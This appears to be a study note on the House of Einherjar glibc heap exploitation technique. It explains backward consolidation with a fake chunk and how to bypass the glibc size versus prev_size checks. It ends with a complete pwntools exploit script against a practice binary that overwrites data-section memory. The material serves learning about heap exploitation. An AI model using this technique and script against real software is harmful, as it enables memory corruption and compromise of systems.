# The House of Einherjar

## Overall 
![image](https://hackmd.io/_uploads/Skq2dxcrR.png)

:::info
- The House of Einherjar was originally presented as a ***single null-byte overflow technique***, but this is not its most realistic application. It assumes an overflow that can ***clear a victim chunk’s prev_inuse bit*** whilst having control of the victim chunk’s prev_size field. 
- The victim’s ***prev_size field*** is populated such that ***when the victim chunk is freed it consolidates backwards with a fake chunk on the heap or elsewhere***. In this case, arbitrary allocations can be made from the fake chunk which could be used to read from or write to sensitive data. 
:::

## Approach
- Clear a chunk’s prev_inuse bit and consolidate it backwards with a fake chunk or an existing free chunk, creating overlapping chunks. 
## Further use
:::success
- It is also possible to consolidate with legitimate free chunks on the heap, creating overlapping chunks which can be used to build a stronger primitive.
- The House of Force, GLIBC versions, 2.28 and below don't have any top chunk size integrity checks, so it's preferable to do things the way we have here by consolidating with the top chunk, unless you're able to modify your fake chunk's size field between consolidation and allocation.
- Not only does this method not require a heap leak, since the distance between chunks on the same heap is both relative and deterministic, but legitimate free chunks will inherently pass this safe unlinking checks.

:::
## Limitations
:::warning
- ***The size vs prev_size check introduced in GLIBC version 2.26*** requires a designer to ***set an appropriate size field in their fake chunk.***
- The second more robust size vs. prev_size check was introduced in ***GLIBC version 2.29*** which requires the fake chunk's size field to actually match the freed chunk's prev_size field.
:::
## Note
In the Safe Unlink technique, I set our counterfeit prev_size field to a value that allowed mallocto find a fake chunk we'd prepared in chunk A's user data, then unlink it in preparation for consolidation. I'm going to do the same thing here for the House of Einherjar, with two small differences.
- The first difference is that our fake chunk won't reside on the heap. Instead, I'll craft it in this program's data section, overlapping the target data.
- The second is that I'm uninterested in leveraging the unlinking process, we don't know the address of any pointers to chunks because unlike the safe_unlink binary, this program keeps its chunk pointers on the stack, which we haven't leaked.
Once we enable ASLR and the distance between the heap and program's data section greatly increases, this can result in a very large fake chunk getting linked into the unsortedbin, which will subsequently fail the size integrity check when we try to allocate it.

## Sanity checks
- It's attempting to ***compare the size field of the chunk being unlinked with the prev_size field that led it to that chunk***. Of course, those two values should match, and this check was introduced specifically as an attempt to combat exploitation of single null byte overflows. Fortunately for us, there are a couple of ways in which we could pass this check.
    - ***The first is simply to set our fake chunk's size field to match that of our bogus prev_size field.*** However, the house of einherjar binary only leaks its heap start address after we've already input our username, which contains our fake chunk metadata, and we're unable to go back and edit it.
    - There is a second way in which we could pass the size and prev_size check, the flaw in this implementation of the size vs prev_size check is that it operates entirely from within the context of the chunk being unlinked, known as the "victim" chunk. It has no idea where the prev_size field that led it to that chunk resides.
        - This means that it has to rely on the size field of the victim chunk in order to locate the prev_size field with which to compare it.
        - This can lead to a disconnect between the prev_size field the macro intends to find and the prev_size field it actually finds.
        - Let's consider what's happening when our fake chunk undergoes this check.
        - The size of the chunk is determined by the chunksize() macro, which simply checks the second quadword at the address it's passed. The result is accurate and in this case, yields 0x31. This value is compared against a prev_size field, which is found as follows:
            - The next_chunk() macro attempts to find the succeeding chunk by adding the victim chunk's size to its address, here 0x602010 one plus 0x30 yields 0x602040, which is not the address of chunk B, rather this random patch of memory in the program's data section.
            - Next, the prev_size() macro simply returns the value at that location. The result is that instead of comparing our fake chunk's size filled with chunk B's prev_size field. It's compared against memory at an offset from our fake chunk that I control.
        - Sadly, in this case, I can't influence any memory after our fake chunk in which to provide another bogus size field, but I don't actually need to. There is one value we can choose for our fake chunk's size that will always pass the size and prev_size check. **That value is 8.**
            
## Script

target.py
:::spoiler
```python=
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_einherjar', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc 

gs = """
b *main
b *main+199

b *main+358

b *main+433
b *main+466

b *main+610
b *main+672

b *main+755
b *main+861
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def send_name(name):
    io.sendafter(b'Enter your username: ', name)
    
def handle():
    io.recvuntil(b'heap @ ')
    heap = int(io.recvline(), 16)
    io.recvuntil(b'> ')
    success('heap @ ' + hex(heap))
    return heap

index = 0
def malloc(size):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', str(size).encode())
    io.recvuntil(b'> ')
    index += 1
    return index - 1

def free(index):
    io.send(b'2')
    io.sendafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')    

def edit(index, data):
    io.send(b'3')
    io.sendafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    
def target():
    io.send(b'4')
    io.recvuntil(b'> ')

def quit():
    io.send(b'5')
    
name = p64(0) + p64(8) + p64(elf.sym['user']) + p64(elf.sym['user'])

io = start()
send_name(name)
heap = handle()

# Request 2 chunks.
overflow = malloc(0x88)
victim = malloc(0xf8) # Free this chunk later to trigger backward consolidation with the fake chunk.

# Single null-byte overflow from the "overflow" chunk into the LSB of the "victim" chunk's size field.
# This clears the "victim" chunk's prev_inuse bit.
# Set the "victim" chunk's prev_size field to the delta between the "victim" chunk and the fake chunk.
prev_size = (heap + 0x90) - elf.sym.user
edit(overflow, b'Y'*0x80 + pack(prev_size))

# Free the "victim" chunk to trigger backward consolidation with the fake chunk.
# Forward consolidation merges the fake chunk with the top chunk.
free(victim)

# If unable to merge with the top chunk, a 2nd edit of the fake chunk's size field is required at this point
# to satisfy the unsortedbin size sanity check (not possible with this pwnable).

# The top chunk now resides in the program's data section.
# Request a chunk from it and overwrite the target data.
data_section = malloc(0x88)
edit(data_section, p64(0)*2 + b"Much win!")

# Confirm the target data was overwritten.
io.sendthen(b"target: ", b"4")
target_data = io.recvuntil(b"\n", True)
assert target_data == b"Much win!"
quit()

# =============================================================================

io.interactive()

```
:::
